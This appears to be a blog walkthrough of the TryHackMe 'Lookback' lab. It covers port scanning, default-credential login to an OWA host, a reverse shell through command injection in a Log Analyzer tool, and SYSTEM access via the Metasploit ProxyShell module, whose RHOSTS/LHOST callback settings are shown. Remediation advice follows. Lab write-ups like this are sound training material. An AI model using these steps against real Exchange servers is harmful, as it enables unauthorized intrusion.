---
icon: fas fa-info-circle
order: 4
categories: Tryhackme
tags: PT1 HTTPS OWA PROXYSHELL DEFAULT-CREDS 
image: https://tryhackme-images.s3.amazonaws.com/room-icons/d8877bf37d4015f1b78d243078dece09.png
---

## Introduction

üëã Greetings, fellow cybersecurity enthusiasts,

Today marks the beginning of my preparation journey for the **TryHackMe PT1** exam, starting with the first recommended room: **Lookback**.

Throughout this series, I will be documenting each room, outlining the techniques used, and sharing key insights to assist others who are also preparing for the exam.

üìò Follow along as we break down each step, reinforce core penetration testing concepts, and build a solid foundation for success.

Let‚Äôs get started.

## Enumeration

To save time and resources I prefer to use one of the fast tools for detecting open ports instead of throwing everything to `nmap` so here we will go with `rustscan` and collect the open ports and then throw them to `nmap`
```php
rustscan -a 10.10.203.74 --ulimit 5000 --accessible | grep 'Open' | awk -F':' '{print $2}' | tr -d ' ' | paste -sd,
```
![screenshot](assets/screenshots/Lookback/1.png)

We will set up DNS resolution by adding appropriate entries to the `/etc/hosts` file.

```
sudo echo "10.10.203.74  WIN-12OUO7A66M7.thm.local" >> /etc/hosts
```
![screenshot](assets/screenshots/Lookback/2.webp)

## Deep Enumeration on the open port and services

In this section, we will examine the services running on ports 80 and 443 to identify the available attack surface.

*Let's begin by examining port 80.*

![screenshot](assets/screenshots/Lookback/3.png)

Upon inspection, no meaningful content or functionality was found on this port, prompting a shift in focus to port 443 for further analysis.

![screenshot](assets/screenshots/Lookback/4.png)

On port 443, an Outlook Web Access (OWA) login page was discovered.

The next step involves enumerating hidden directories and attempting to uncover valid credentials, aiming to expand the attack surface and identify potential entry points.

### Directory fuzzing
I used the fast tool for directory fuzzign `dirsearch` which uncovered some interesting directories

![screenshot](assets/screenshots/Lookback/5.webp)

Taking a look on the `test` directory on the web 

![screenshot](assets/screenshots/Lookback/6.png)

While exploring the `/test` directory on the web server, I stumbled upon something interesting yet slightly annoying.

The developer has secured nearly every page behind a login system. From a security standpoint, that‚Äôs commendable. But from an attacker's perspective? That‚Äôs an open invitation to start hunting for credentials.

üîê Let the credential hunt begin, it‚Äôs time to break through the gates and dig deeper.

## Foothold

To expand enumeration, I ran a quick scan using Nikto against the target.

Surprisingly and quite humorously  Nikto handed me credentials on a silver platterü§£ü§£:

![screenshot](assets/screenshots/Lookback/7.webp)

This kind of misconfiguration is a goldmine during pentests. While using weak or default credentials like admin: REDACTED is a common mistake, it still never fails to shock me when it works in real environments.

With these credentials in hand, it‚Äôs time to try authenticating and escalate access further.

Let‚Äôs see what kind of doors this combo can unlock. üîì

![screenshot](assets/screenshots/Lookback/8.png)

‚úÖ Successfully logged in using the credentials obtained and immediately landed on a Log Analyzer interface.

Not only did I retrieve the first flag here üèÅ, but the presence of this tool also suggests potential for deeper exploitation.

üß† The next step is to analyze how this Log Analyzer tool functions  what technologies it uses, how it processes input, and whether it introduces any security flaws (like, file upload, command injection, or LFI vulnerabilities).

Time to dig into its behavior and uncover any weak spots we can weaponize.

Lets try submitting double quote and see how it responds

![screenshot](assets/screenshots/Lookback/10.webp)

Submitting a single quote:

![screenshot](assets/screenshots/Lookback/11.webp)

## Exploitation
After reviewing how the Log Analyzer tool processes input, it appears to be vulnerable ‚Äî a perfect opportunity to attempt code execution.

With that in mind, the next objective is clear: gain a reverse shell and establish a foothold on the target machine.

I‚Äôll craft a payload and set up a listener on my attacking machine. If the tool handles logs insecurely or executes them directly, we may be looking at a direct path to shell access.

#### üîê Bypassing Character Restrictions with Base64 Encoding

To gain a reverse shell through the vulnerable Log Analyzer, I needed to bypass input filtering or character limitations. A reliable approach in such cases is to base64-encode the payload, then decode and execute it on the target system.
So encode the payload before running it and set up a listerner on the Attacking Machine to capture the reverse shell

![screenshot](assets/screenshots/Lookback/12.png)

The Shell received on the Attacker Machine

![screenshot](assets/screenshots/Lookback/13.png)

The reverse shell successfully connected back, and I now have interactive access to the target system as:
```
User: thm\admin
```

While this provides a solid foothold, it‚Äôs important to note that we are not yet NT-authority, so further privilege escalation will be necessary. But for now lets go and find the flag

![screenshot](assets/screenshots/Lookback/14.png)

## üìÑ Post-Exploitation Discovery: TODO.txt

While enumerating user directories, I navigated to:

```
C:\Users\dev\Desktop
```

Inside, I found two interesting files:

    user.txt: üéØ Contains the second flag:

    THM{REDUCTED}

    TODO.txt: üìù A developer task list containing sensitive internal notes.

Key highlight from TODO.txt:
```
Install the Security Update for MS Exchange [TO BE DONE]
```


üö® This is a serious misconfiguration. The system appears to be running Microsoft Exchange, and the required security update has not yet been installed. This likely leaves the system vulnerable to known Exchange-related exploits such as:

    ProxyShell

    ProxyLogon

    PrivExchange

These are widely documented vulnerabilities that allow attackers to escalate privileges, execute arbitrary commands, or even dump credentials ‚Äî especially if Exchange is misconfigured or unpatched.

## Escalation Process To NT-authority

Based on the findings in TODO.txt, it was confirmed that the Microsoft Exchange server is unpatched ‚Äî leaving it vulnerable to the ProxyShell attack chain.

To exploit this, I used the Metasploit module:
```
exploit/windows/http/exchange_proxyshell_rce
```
![screenshot](assets/screenshots/Lookback/15.png)

Before executing the exchange_proxyshell_rce Metasploit module, I configured the required parameters to ensure a successful reverse shell callback:

```
set EMAIL dev-infrastracture-team@thm.local
set RHOSTS 10.10.252.14
set LHOST 10.23.26.210
```

EMAIL: A valid internal address discovered from the TODO.txt file ‚Äî required for the ProxyShell exploit chain to work.

RHOSTS: The target machine's IP address.

LHOST: My attack machine's IP for receiving the reverse connection.

With everything in place, I proceeded to run the exploit and awaited a callback to my listener.


## ‚úÖ Exploit Success  *SYSTEM Access Achieved*

After launching the exchange_proxyshell_rce exploit with the correctly configured parameters, the module successfully established a Meterpreter session:

![screenshot](assets/screenshots/Lookback/16.png)

## üß© Conclusion

The Lookback room offered a realistic simulation of a misconfigured enterprise environment, emphasizing the critical importance of patch management and secure configurations. The attack chain demonstrated how an attacker can:

    Identify externally exposed services (OWA on port 443),

    Exploit weak/default credentials (admin:admin),

    Discover sensitive internal files (e.g., TODO.txt),

    And ultimately exploit an unpatched Microsoft Exchange server using the ProxyShell vulnerability to gain full SYSTEM access.

Each phase of the attack ‚Äî from enumeration to post-exploitation ‚Äî highlighted real-world missteps often found in production systems.


## üîí Remediation Recommendations

To prevent such attacks in a real-world environment, the following remediation steps are strongly recommended:

    Enforce Strong Authentication

        Disable or remove default credentials.

        Enforce password complexity and implement multi-factor authentication (MFA) for all web-accessible services like Outlook Web Access.

    Patch Management

        Apply critical updates promptly, especially for services like Microsoft Exchange.

        Monitor and verify patch installation regularly with automated tools.

    Limit Exposure of Internal Tools

        Remove development or debug tools (e.g., Log Analyzer) from production environments.

        Use proper access control and network segmentation to isolate internal services.

    Sensitive File Hygiene

        Avoid leaving sensitive files like TODO.txt or plaintext task notes on accessible user desktops.

        Use centralized ticketing or task management systems with restricted access.

    Web Server Hardening

        Configure proper HTTP security headers (e.g., X-Frame-Options, X-Content-Type-Options).

        Regularly audit web servers for misconfigurations and outdated components.

    Log Monitoring & Incident Response

        Implement logging and alerting for unauthorized login attempts and exploitation behaviors.

        Establish a response plan to act swiftly in case of compromise.


‚úçÔ∏è Till next time, hackers.
Stay sharp, stay curious  and never stop hunting.

#SerialKiller #Sniper #KillTheLimits #OperationFireball #RedTeaming #Pentesting #TryHackMe #PT1Prep